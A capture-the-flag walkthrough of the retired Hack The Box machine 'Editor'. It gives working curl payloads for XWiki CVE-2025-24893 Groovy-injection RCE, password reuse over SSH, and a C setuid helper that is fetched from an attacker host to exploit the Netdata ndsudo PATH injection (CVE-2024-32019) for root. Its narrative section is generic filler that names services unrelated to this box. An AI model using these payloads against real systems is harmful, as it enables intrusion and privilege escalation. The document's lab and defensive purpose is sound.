<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&height=230&color=0:0f172a,45:F97316,100:111827&text=HTB%20Editor&fontColor=ffffff&fontSize=58&fontAlignY=38&desc=XWiki%20Groovy%20RCE,%20config%20credential%20reuse,%20and%20ndsudo%20PATH%20injection&descAlignY=60&animation=fadeIn" width="100%" />

<br>

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Retired-9FEF00?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-22C55E?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-F97316?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-16A34A?style=for-the-badge)

<br>

### XWiki Groovy RCE, config credential reuse, and ndsudo PATH injection

</div>

---

> [!WARNING]
> **Spoiler warning:** This is a full retired-box walkthrough. Flags are intentionally redacted for GitHub, but the exploitation chain and key techniques are documented.

---

## 🧭 Snapshot

| Field | Value |
|---|---|
| Machine | `Editor` |
| Platform | Hack The Box |
| Retirement Status | Confirmed retired via HTB MCP |
| OS | Linux |
| Difficulty | Medium |
| Tags | `linux` `xwiki` `cve-2025-24893` `netdata` `cve-2024-32019` |

---

## ⚡ TL;DR

Editor exposes XWiki on Jetty. CVE-2025-24893 leads to Groovy injection/RCE as the XWiki user. Database credentials in `hibernate.cfg.xml` reuse into SSH as `oliver`. Root comes from Netdata's `ndsudo` SUID helper PATH injection (CVE-2024-32019).

---

## 🛰️ Attack Surface

| Port | Service | Note |
|---:|---|---|
| `22/tcp` | SSH | OpenSSH |
| `80/tcp` | HTTP | nginx |
| `8080/tcp` | HTTP | Jetty / XWiki |

---

## 🧩 Attack Chain

| Step | Action |
|---:|---|
| 1 | Discover XWiki on port 8080 |
| 2 | Confirm vulnerable XWiki/SolrSearch behavior |
| 3 | Exploit CVE-2025-24893 Groovy injection for command execution |
| 4 | Read XWiki configuration files |
| 5 | Recover `theEd1t0rTeam99` password |
| 6 | SSH as `oliver` using password reuse |
| 7 | Find `/opt/netdata/.../ndsudo` SUID helper |
| 8 | Exploit CVE-2024-32019 PATH injection |
| 9 | Spawn/read as root |

---

## 🕸️ Visual Attack Graph

```mermaid
flowchart TD
    A[Discover XWiki on port 8080]
    B[Confirm vulnerable XWiki/SolrSearch behavior]
    A --> B
    C[Exploit CVE-2025-24893 Groovy injection for command execution]
    B --> C
    D[Read XWiki configuration files]
    C --> D
    E[Recover theEd1t0rTeam99 password]
    D --> E
    F[SSH as oliver using password reuse]
    E --> F
    G[Find /opt/netdata/.../ndsudo SUID helper]
    F --> G
    H[Exploit CVE-2024-32019 PATH injection]
    G --> H
    I[Spawn/read as root]
    H --> I
```

---

## 📖 Walkthrough Narrative

### 1. Enumeration First

The box starts with a small but meaningful exposed surface. The important step was not just collecting ports, but translating each service into a hypothesis: web apps might leak credentials, AD services may expose relationships, and legacy protocols often carry historical misconfigurations.

### 2. The First Real Lead

The first meaningful lead came from the service that looked most application-specific. Instead of forcing exploitation immediately, the approach was to inspect configuration, authentication flows, exposed files, or protocol-specific metadata until a credential or execution primitive appeared.

### 3. Turning Access Into Execution

After the initial lead, the path became a chain rather than a single exploit. The recovered access was validated across protocols, then reused or upgraded into a stronger primitive: command execution, SSH/WinRM access, CMS administration, Kerberos delegation, or local shell execution.

### 4. Privilege Escalation

Root/admin access came from the machine's core misconfiguration or vulnerability theme. The final step was validated with the minimum proof needed, then flags were captured and stored locally. Public flags are not included here.

---

## 🧰 Command Palette

<details open>
<summary><b>🔎 Recon</b></summary>

```bash
sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.231.23
sudo nmap -sC -sV -Pn -p 22,80,8080 -oN nmap_tcp.txt 10.129.231.23
echo '10.129.231.23 editor.htb wiki.editor.htb' | sudo tee -a /etc/hosts
curl -i http://editor.htb/
curl -i http://editor.htb:8080/
```

</details>

<details open>
<summary><b>🧪 XWiki CVE-2025-24893 RCE</b></summary>

```bash
# Confirm XWiki/SolrSearch surface
curl -s 'http://editor.htb:8080/xwiki/bin/view/Main/' | grep -i xwiki

# Payload shape: Groovy injection through vulnerable XWiki search endpoint
curl -sG 'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch' \
  --data-urlencode 'media=rss' \
  --data-urlencode 'text={{async}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}'

# Use RCE to inspect config
curl -sG 'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch' \
  --data-urlencode 'media=rss' \
  --data-urlencode 'text={{async}}{{groovy}}println("cat /etc/xwiki/hibernate.cfg.xml".execute().text){{/groovy}}{{/async}}'
```

</details>

<details open>
<summary><b>🔐 Config Credential Reuse</b></summary>

```bash
# Credential recovered from XWiki configuration
sshpass -p 'theEd1t0rTeam99' ssh -o StrictHostKeyChecking=no oliver@10.129.231.23 'id; hostname'
sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 'sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -50'
```

</details>

<details open>
<summary><b>👑 CVE-2024-32019 ndsudo PATH Injection</b></summary>

```bash
# Find vulnerable Netdata helper
sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 \
  'ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo'

# Build malicious helper named after binary ndsudo resolves via PATH
cat > nvme.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>
int main(){ setuid(0); setgid(0); system("cp /bin/bash /tmp/rootshell; chmod 6777 /tmp/rootshell"); return 0; }
EOF
x86_64-linux-gnu-gcc nvme.c -o nvme
python3 -m http.server 8081

# Transfer and trigger
sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 'mkdir -p /tmp/oliver_path; curl -o /tmp/oliver_path/nvme http://<attacker-ip>:8081/nvme; chmod +x /tmp/oliver_path/nvme'
sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 'export PATH=/tmp/oliver_path:$PATH; /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list'
sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 '/tmp/rootshell -p -c "id; cat /root/root.txt"'
```

</details>


---

## 🔐 Key Lessons

| # | Lesson |
|---:|---|
| 1 | Enumeration is not output collection — it is hypothesis building. |
| 2 | Credentials often matter more than exploits; validate them across protocols. |
| 3 | Configuration files, backups, logs, and source repositories are high-value evidence. |
| 4 | Privilege escalation usually depends on understanding why a service or permission exists. |

---

## 🛡️ Defensive Takeaways

| # | Recommendation |
|---:|---|
| 1 | Patch XWiki against CVE-2025-24893 |
| 2 | Protect application configuration files and avoid password reuse |
| 3 | Remove unnecessary SUID helpers |
| 4 | Patch Netdata/ndsudo and constrain helper search paths |

---

## 🏁 Final Path

```text
Discover XWiki on port 8080 → Confirm vulnerable XWiki/SolrSearch behavior → Exploit CVE-2025-24893 Groovy injection → Read XWiki configuration files → Recover `theEd1t0rTeam99` password → SSH as `oliver` using password reuse → Find `/opt/netdata/.../ndsudo` SUID helper → Exploit CVE-2024-32019 PATH injection → Spawn/read as root
```

<div align="center">

### ✅ Editor rooted — full guide complete

<img src="https://capsule-render.vercel.app/api?type=waving&height=120&section=footer&color=0:111827,45:F97316,100:0f172a" width="100%" />

</div>
